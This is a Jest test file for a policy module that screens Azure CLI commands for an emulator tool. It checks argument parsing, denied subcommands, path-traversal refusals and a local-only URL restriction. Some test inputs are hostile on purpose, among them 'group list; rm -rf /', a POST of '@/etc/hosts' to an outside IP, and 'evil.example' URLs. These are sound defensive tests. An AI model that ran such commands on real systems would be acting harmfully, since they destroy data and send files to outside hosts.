import { AzSyntaxError, splitAzArgs } from "./argv";
import { evaluateAzCommand } from "./policy";

const allowed = (command: string) => {
  const result = evaluateAzCommand(command);
  if (!result.ok) throw new Error(`refused: ${result.message}`);
  return result;
};
const refusal = (command: string) => {
  const result = evaluateAzCommand(command);
  if (result.ok) throw new Error(`allowed: ${command}`);
  return result;
};

describe("splitAzArgs", () => {
  test("quotes, empty arguments, data inside quotes and literal backslashes", () => {
    expect(
      splitAzArgs(`x -n "my group" --tags 'a=b c' --v "" --q "\`a\`" C:\\tmp\\a $NAME`)
    ).toEqual([
      "x",
      "-n",
      "my group",
      "--tags",
      "a=b c",
      "--v",
      "",
      "--q",
      "`a`",
      "C:\\tmp\\a",
      "$NAME",
    ]);
    expect(splitAzArgs('x "\\$HOME \\` \\" \\\\" "a\\\nb"')).toEqual(["x", '$HOME ` " \\', "ab"]);
  });

  test.each(["a; b", "a && b", "a | b", "a > f", "a $(b)", "a ${b}", "a `b`", "a\nb", 'a "open'])(
    "refuses %j",
    (command) => expect(() => splitAzArgs(command)).toThrow(AzSyntaxError)
  );
});

describe("evaluateAzCommand", () => {
  test("strips one leading az and passes the argv through", () => {
    expect(allowed("az group list -o table")).toEqual({
      ok: true,
      argv: ["group", "list", "-o", "table"],
      notes: [],
    });
    expect(allowed("--help").argv).toEqual(["--help"]);
  });

  test.each([
    ["", "No command given"],
    ["az az group list", "Extra executable"],
    ["azlocal group list", "Extra executable"],
    ["--debug group list", "Not a valid command"],
    ["group list; rm -rf /", "Command not understood"],
  ])("refuses %j (%s)", (command, title) => {
    expect(refusal(command).title).toContain(title);
  });

  test("refuses --version, which asks PyPI for updates, and allows the offline version", () => {
    expect(refusal("--version").message).toContain("use `version`");
    expect(allowed("version").argv).toEqual(["version"]);
  });

  test.each([
    "login",
    "logout",
    "account clear",
    "cloud set --name AzureCloud",
    "config set core.output=table",
    "extension add --name fleet",
    "upgrade",
    "bicep install",
    "aks install-cli",
    "storage copy -s a -d b",
    "storage fs directory upload -f fs -s ./dir --account-name a",
    "storage fs directory download -f fs -s dir -d ./out --account-name a",
    "find vm",
    "webapp ssh -n app -g rg",
    "ssh vm -n vm1 -g rg",
  ])("denies %j", (command) => {
    expect(refusal(command).message).toMatch(/is not allowed here: /);
  });

  test("allows config get, and commands that only share a word with a denied one", () => {
    expect(allowed("config get core.output").argv[0]).toBe("config");
    expect(allowed("cloud show").argv).toEqual(["cloud", "show"]);
    expect(allowed("extension list").argv).toEqual(["extension", "list"]);
  });

  test("denied flags, matched exactly", () => {
    expect(refusal("container logs -n c -g rg --follow").title).toBe("Flag not allowed");
    expect(refusal("webapp up -n app -b").message).toContain(
      "`az webapp up` cannot be run with `-b`"
    );
    expect(allowed("group list -b x").argv).toContain("-b"); // -b is denied only on webapp up
    // az reads these as --location and --force-deletion, not as the denied flags they start.
    expect(allowed("group create -n rg --lo westeurope").argv).toContain("--lo");
    expect(allowed("vm delete -n vm1 -g rg --fo --yes").argv).toContain("--fo");
  });

  test.each([
    "storage blob upload -f ../secret.txt -c c -n n",
    "storage blob upload -f../secret.txt -c c -n n",
    "storage blob upload -f..\\secret.txt -c c -n n",
    "deployment group create -g rg --template-file=..\\up\\main.json",
    "group create -n x --tags @../tags.json",
    "rest --url /a/../b",
  ])("refuses path traversal: %j", (command) => {
    expect(refusal(command).message).toContain("path traversal");
  });

  test("leaves dots that are not a path segment alone", () => {
    expect(allowed("group list --query \"[?name=='a..b']\"").argv).toHaveLength(4);
    expect(allowed("storage blob upload -f ./data/hello.txt").argv).toContain("./data/hello.txt");
  });

  test("rewrites a management.azure.com URL given to rest into a relative path", () => {
    const rest = allowed("rest --url https://management.azure.com/subscriptions?api-version=1");
    expect(rest.argv).toEqual(["rest", "--url", "/subscriptions?api-version=1"]);
    expect(rest.notes[0]).toContain("relative path `/subscriptions?api-version=1`");
    expect(allowed("rest --uri=HTTPS://Management.Azure.Com:443/x").argv[1]).toBe("--uri=/x");
    expect(allowed("rest -u https://management.azure.com").argv[2]).toBe("/");
  });

  test("rest calls local hosts only: a file given as the body would go wherever the URL points", () => {
    for (const command of [
      "rest --method post --url http://10.1.2.3:8080/x --body @/etc/hosts",
      "rest --uri=HTTP://evil.example/x",
      "rest -uhttps://evil.example/x",
      "rest --ur https://evil.example/x", // az finds --ur ambiguous; refused all the same
      "rest --url http:evil.example/x",
      "rest --url https://management.azure.com.evil.example/x",
      "rest --url https://localhost@evil.example/x",
    ]) {
      expect(refusal(command).title).toBe("URL not allowed");
    }
    for (const url of [
      "https://azure.localhost.localstack.cloud:4566/x",
      "http://localhost:4566/_localstack/health",
      "http://127.0.0.1:4566/x",
      "/subscriptions?api-version=2022-12-01",
      "//evil.example/x", // no scheme: az puts the emulator's endpoint before it
    ]) {
      expect(allowed(`rest --url ${url}`).argv[2]).toBe(url);
    }
    expect(allowed("group list --query https://management.azure.com/x").notes).toEqual([]);
  });

  test("a leading ~ is the user's home, not the tool's private one", () => {
    const linux = { home: "/home/u", platform: "linux" as NodeJS.Platform };
    const argv = (command: string, user = linux) => {
      const result = evaluateAzCommand(command, user);
      if (!result.ok) throw new Error(result.message);
      return result.argv;
    };
    expect(argv("deployment group create -g rg --template-file ~/infra/main.json")[6]).toBe(
      "/home/u/infra/main.json"
    );
    expect(argv("rest --url /x --body @~/b.json")[4]).toBe("@/home/u/b.json");
    expect(argv("bicep build --file=~/main.bicep")[2]).toBe("--file=/home/u/main.bicep");
    expect(argv("storage blob upload -f~/a.txt -c c")[3]).toBe("-f/home/u/a.txt");
    expect(argv("storage blob upload -f=~/a.txt -c c")[3]).toBe("-f=/home/u/a.txt");
    expect(argv("group list --query ~x --tags a=~/b")).toEqual([
      "group",
      "list",
      "--query",
      "~x",
      "--tags",
      "a=~/b",
    ]);
    const windows = { home: "C:\\Users\\u", platform: "win32" as const };
    expect(argv("storage blob upload -f ~\\a.txt", windows)[4]).toBe("C:\\Users\\u\\a.txt");
  });
});
